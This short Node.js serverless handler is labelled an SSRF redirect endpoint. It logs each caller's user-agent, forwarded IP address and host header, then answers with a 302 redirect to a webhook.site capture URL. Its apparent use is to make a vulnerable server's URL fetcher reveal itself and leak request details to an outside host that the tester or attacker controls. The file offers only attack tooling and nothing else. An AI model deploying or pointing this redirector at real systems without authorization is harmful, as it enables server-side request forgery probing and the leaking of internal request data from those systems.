module.exports = (req, res) => {
  console.log("Incoming request to SSRF redirect endpoint");
  console.log("UA:", req.headers["user-agent"]);
  console.log("IP:", req.headers["x-forwarded-for"]);
  console.log("Host:", req.headers["host"]);

  res.statusCode = 302;
  res.setHeader(
    "Location",
    "https://webhook.site/b207a2e9-0e78-402d-8a03-b7312bf5d7fd"
  );
  res.end("Redirecting...");
};
